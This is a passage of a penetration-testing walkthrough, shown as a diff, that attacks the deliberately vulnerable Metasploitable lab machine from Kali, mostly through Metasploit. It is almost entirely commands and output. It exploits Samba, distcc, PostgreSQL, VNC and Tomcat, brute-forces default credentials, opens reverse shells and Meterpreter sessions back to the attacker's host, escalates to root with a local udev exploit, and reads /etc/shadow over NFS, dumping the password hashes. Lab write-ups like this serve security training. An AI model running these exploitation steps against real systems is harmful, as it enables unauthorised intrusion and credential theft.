+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+   cmd/unix/reverse_zsh                                 normal  Unix Command Shell, Reverse TCP (via Zsh)
+
+msf exploit(usermap_script) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(usermap_script) > show options 
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.174.132  yes       The target address
+   RPORT  139              yes       The target port
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(usermap_script) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(usermap_script) > set RPORT 445
+RPORT => 445
+msf exploit(usermap_script) > exploit 
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 0H7BQcbRaUuGP6R3;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "0H7BQcbRaUuGP6R3\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 6 opened (192.168.174.137:4444 -> 192.168.174.132:38554) at 2016-01-25 18:54:42 -0500
+
+id
+uid=0(root) gid=0(root)
+
+12.) Enumerating port - 2049/tcp - nfs - 2-4 (RPC #100003) -> Other approach
+In Kali
+root@kali:~# showmount -e 192.168.174.132
+Export list for 192.168.174.132:
+/ *
+root@kali:~# mkdir mount_point
+root@kali:~# mount -t nfs 192.168.174.132:/ ~/mount_point -o nolock
+root@kali:~# cat ~/mount_point/etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+snmp:*:15480:0:99999:7:::
+root@kali:~# 
+
+13.) Enumerating port - 3306/tcp- mysql - MySQL 5.0.51a-3ubuntu5
+In Kali
+root@kali:~# mysql -u root -h 192.168.174.132
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 9
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| owasp10            |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+7 rows in set (0.00 sec)
+
+mysql> 
+
+14.) Enumerating port - 3632/tcp - distccd - distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+In msf
+msf > search distccd
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                           Disclosure Date  Rank       Description
+   ----                           ---------------  ----       -----------
+   exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution
+
+msf > use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) > show options 
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  3632             yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(distcc_exec) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(distcc_exec) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(distcc_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(distcc_exec) > show options 
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.174.132  yes       The target address
+   RPORT  3632             yes       The target port
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(distcc_exec) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(distcc_exec) > exploit 
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo nlcIFqexxzoI7lQU;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "nlcIFqexxzoI7lQU\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 7 opened (192.168.174.137:4444 -> 192.168.174.132:42452) at 2016-01-25 19:21:10 -0500
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+<--manual>
+
+15.) Enumerating port 5432/tcp - postgresql - PostgreSQL DB 8.3.0 - 8.3.7
+In msf
+msf > search postgresql
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Description
+   ----                                                       ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(postgres_login) > show options 
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME          postgres                                                                      no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+msf auxiliary(postgres_login) > set RHOSTS 192.168.174.132
+RHOSTS => 192.168.174.132
+msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true 
+STOP_ON_SUCCESS => true
+msf auxiliary(postgres_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.132:5432 POSTGRES - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.132:5432 POSTGRES - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[!] No active DB -- Credential data will not be saved!
+[!] No active DB -- Credential data will not be saved!
+[+] 192.168.174.132:5432 - LOGIN SUCCESSFUL: postgres:postgres@template1
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(postgres_login) > 
+msf > search postgres
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Description
+   ----                                                       ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
+   auxiliary/analyze/jtr_postgres_fast                                         normal     John the Ripper Postgres SQL Password Cracker
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_hashdump                                normal     Postgres Password Hashdump
+   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_schemadump                              normal     Postgres Schema Dump
+   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+msf > use exploit/linux/postgres/postgres_payload
+msf exploit(postgres_payload) > show options 
+
+Module options (exploit/linux/postgres/postgres_payload):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
+   RHOST                      yes       The target address
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf exploit(postgres_payload) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(postgres_payload) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                    Disclosure Date  Rank    Description
+   ----                                    ---------------  ----    -----------
+   generic/custom                                           normal  Custom Payload
+   generic/debug_trap                                       normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                                   normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                normal  Generic Command Shell, Reverse TCP Inline
+   generic/tight_loop                                       normal  Generic x86 Tight Loop
+   linux/x86/chmod                                          normal  Linux Chmod
+   linux/x86/exec                                           normal  Linux Execute Command
+   linux/x86/meterpreter/bind_ipv6_tcp                      normal  Linux Meterpreter, Bind TCP Stager (IPv6)
+   linux/x86/meterpreter/bind_nonx_tcp                      normal  Linux Meterpreter, Bind TCP Stager
+   linux/x86/meterpreter/bind_tcp                           normal  Linux Meterpreter, Bind TCP Stager
+   linux/x86/meterpreter/reverse_ipv6_tcp                   normal  Linux Meterpreter, Reverse TCP Stager (IPv6)
+   linux/x86/meterpreter/reverse_nonx_tcp                   normal  Linux Meterpreter, Reverse TCP Stager
+   linux/x86/meterpreter/reverse_tcp                        normal  Linux Meterpreter, Reverse TCP Stager
+   linux/x86/metsvc_bind_tcp                                normal  Linux Meterpreter Service, Bind TCP
+   linux/x86/metsvc_reverse_tcp                             normal  Linux Meterpreter Service, Reverse TCP Inline
+   linux/x86/read_file                                      normal  Linux Read File
+   linux/x86/shell/bind_ipv6_tcp                            normal  Linux Command Shell, Bind TCP Stager (IPv6)
+   linux/x86/shell/bind_nonx_tcp                            normal  Linux Command Shell, Bind TCP Stager
+   linux/x86/shell/bind_tcp                                 normal  Linux Command Shell, Bind TCP Stager
+   linux/x86/shell/reverse_ipv6_tcp                         normal  Linux Command Shell, Reverse TCP Stager (IPv6)
+   linux/x86/shell/reverse_nonx_tcp                         normal  Linux Command Shell, Reverse TCP Stager
+   linux/x86/shell/reverse_tcp                              normal  Linux Command Shell, Reverse TCP Stager
+   linux/x86/shell_bind_ipv6_tcp                            normal  Linux Command Shell, Bind TCP Inline (IPv6)
+   linux/x86/shell_bind_tcp                                 normal  Linux Command Shell, Bind TCP Inline
+   linux/x86/shell_bind_tcp_random_port                     normal  Linux Command Shell, Bind TCP Random Port Inline
+   linux/x86/shell_reverse_tcp                              normal  Linux Command Shell, Reverse TCP Inline
+   linux/x86/shell_reverse_tcp2                             normal  Linux Command Shell, Reverse TCP Inline - Metasm Demo
+
+msf exploit(postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf exploit(postgres_payload) > show options 
+
+Module options (exploit/linux/postgres/postgres_payload):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
+   RHOST     192.168.174.132  yes       The target address
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   DebugOptions  0                no        Debugging options for POSIX meterpreter
+   LHOST                          yes       The listen address
+   LPORT         4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf exploit(postgres_payload) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(postgres_payload) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Login failed, fingerprint is 8.3.8
+[-] Authentication failed.
+msf exploit(postgres_payload) > set PASSWORD postgres
+PASSWORD => postgres
+msf exploit(postgres_payload) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] 192.168.174.132:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[*] Uploaded as /tmp/CXeeofhN.so, should be cleaned up automatically
+[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
+[*] Sending stage (1241088 bytes) to 192.168.174.132
+[*] Meterpreter session 1 opened (192.168.174.137:4444 -> 192.168.174.132:54822) at 2016-01-25 19:31:38 -0500
+
+meterpreter > getuid 
+Server username: uid=108, gid=117, euid=108, egid=117, suid=108, sgid=117
+meterpreter > background 
+[*] Backgrounding session 1...
+msf exploit(postgres_payload) > back
+msf > use exploit/linux/local/udev_netlink
+msf exploit(udev_netlink) > show options 
+
+Module options (exploit/linux/local/udev_netlink):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                       yes       The session to run this module on.
+   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf exploit(udev_netlink) > sessions -i
+
+Active sessions
+===============
+
+  Id  Type                   Information                                                                Connection
+  --  ----                   -----------                                                                ----------
+  1   meterpreter x86/linux  uid=108, gid=117, euid=108, egid=117, suid=108, sgid=117 @ metasploitable  192.168.174.137:4444 -> 192.168.174.132:54822 (192.168.174.132)
+
+msf exploit(udev_netlink) > set session 1
+session => 1
+msf exploit(udev_netlink) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Attempting to autodetect netlink pid...
+[*] Meterpreter session, using get_processes to find netlink pid
+[*] udev pid: 2719
+[+] Found netlink pid: 2718
+[*] Writing payload executable (274 bytes) to /tmp/xaVKQXjfws
+[*] Writing exploit executable (1879 bytes) to /tmp/GSpLXmOHlN
+[*] chmod'ing and running it...
+[*] Command shell session 2 opened (192.168.174.137:4444 -> 192.168.174.132:54823) at 2016-01-25 19:32:17 -0500
+
+id
+uid=0(root) gid=0(root)
+
+16.) Enumerating port 5900/tcp - vnc - VNC (protocol 3.3)
+root@kali:~# vncviewer 192.168.174.132
+Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password: password
+Authentication successful
+Desktop name "root's X desktop (metasploitable:0)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using shared memory PutImage
+
+17.) Enumerating port 8180/tcp - http - Apache Tomcat/Coyote JSP engine 1.1
+In msf
+msf > search tomcat
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                Disclosure Date  Rank       Description
+   ----                                                ---------------  ----       -----------
+   auxiliary/admin/http/tomcat_administration                           normal     Tomcat Administration Tool Default Access
+   auxiliary/admin/http/tomcat_utf8_traversal                           normal     Tomcat UTF-8 Directory Traversal Vulnerability
+   auxiliary/admin/http/trendmicro_dlp_traversal                        normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   auxiliary/dos/http/apache_commons_fileupload_dos    2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS
+   auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   auxiliary/dos/http/hashcollision_dos                2011-12-28       normal     Hashtable Collisions
+   auxiliary/scanner/http/tomcat_enum                                   normal     Apache Tomcat User Enumeration
+   auxiliary/scanner/http/tomcat_mgr_login                              normal     Tomcat Application Manager Login Utility
+   exploit/multi/http/struts_code_exec_classloader     2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
+   exploit/multi/http/struts_default_action_mapper     2013-07-02       excellent  Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
+   exploit/multi/http/struts_dev_mode                  2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution
+   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
+   post/windows/gather/enum_tomcat                                      normal     Windows Gather Apache Tomcat Enumeration
+
+
+msf > use auxiliary/admin/http/tomcat_administration
+msf auxiliary(tomcat_administration) > show options 
+
+Module options (auxiliary/admin/http/tomcat_administration):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        8180             yes       The target port
+   THREADS      1                yes       The number of concurrent threads
+   TOMCAT_PASS                   no        The password for the specified username
+   TOMCAT_USER                   no        The username to authenticate as
+   VHOST                         no        HTTP server virtual host
+
+msf auxiliary(tomcat_administration) > set RHOSTS 192.168.174.132
+RHOSTS => 192.168.174.132
+msf auxiliary(tomcat_administration) > run
+
+[*] http://192.168.174.132:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(tomcat_administration) > back 
+msf > use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(tomcat_mgr_deploy) > show options 
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                      yes       The target address
+   RPORT     80               yes       The target port
+   USERNAME                   no        The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf exploit(tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf exploit(tomcat_mgr_deploy) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                            Disclosure Date  Rank    Description
+   ----                            ---------------  ----    -----------
+   generic/custom                                   normal  Custom Payload
+   generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
+   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
+   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
+   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
+   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
+   java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
+   java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
+   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
+
+msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf exploit(tomcat_mgr_deploy) > show options 
+
+Module options (exploit/multi/http/tomcat_mgr_deploy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  tomcat           no        The password for the specified username
+   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     192.168.174.132  yes       The target address
+   RPORT     8180             yes       The target port
+   USERNAME  tomcat           no        The username to authenticate as
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tomcat_mgr_deploy) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(tomcat_mgr_deploy) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6482 bytes as yGuIRm3hIw6Tyu1s0VHzE4J5jKtmqc1.war ...
+[*] Executing /yGuIRm3hIw6Tyu1s0VHzE4J5jKtmqc1/4kXBs3WGdG.jsp...
+[*] Undeploying yGuIRm3hIw6Tyu1s0VHzE4J5jKtmqc1 ...
+[*] Sending stage (30680 bytes) to 192.168.174.132
+[*] Meterpreter session 3 opened (192.168.174.137:4444 -> 192.168.174.132:43340) at 2016-01-25 19:41:14 -0500
+
+meterpreter > getuid 
+Server username: tomcat55
+meterpreter > 
+
+18.) Password Cracking
+root@metasploitable:/home/msfadmin# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+snmp:x:115:65534::/var/lib/snmp:/bin/false
+root@metasploitable:/home/msfadmin# 
+ 
+root@metasploitable:/home/msfadmin# cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
